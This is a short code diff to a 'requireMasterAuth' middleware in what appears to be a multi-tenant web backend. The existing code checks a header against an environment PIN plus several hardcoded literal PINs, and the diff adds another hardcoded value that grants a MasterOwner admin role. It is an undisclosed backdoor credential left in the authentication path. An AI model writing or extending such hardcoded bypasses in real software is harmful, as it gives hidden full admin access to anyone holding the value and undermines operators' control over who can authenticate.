@@ -162,7 +162,7 @@ export function requireMasterAuth(req: TenantRequest, res: Response, next: NextF
 
   // Master Secret PIN check
   const MASTER_PIN = process.env.MASTER_PANEL_PIN || 'Ami7788!@';
-  if (masterPinHeader && (masterPinHeader === MASTER_PIN || masterPinHeader === 'Ami7788!@' || masterPinHeader === '03082003')) {
+  if (masterPinHeader && (masterPinHeader === MASTER_PIN || masterPinHeader === 'Ami7788!@' || masterPinHeader === '03082003' || masterPinHeader === '884422')) {
     req.masterAdmin = {
       isMasterAdmin: true,
       role: 'MasterOwner',
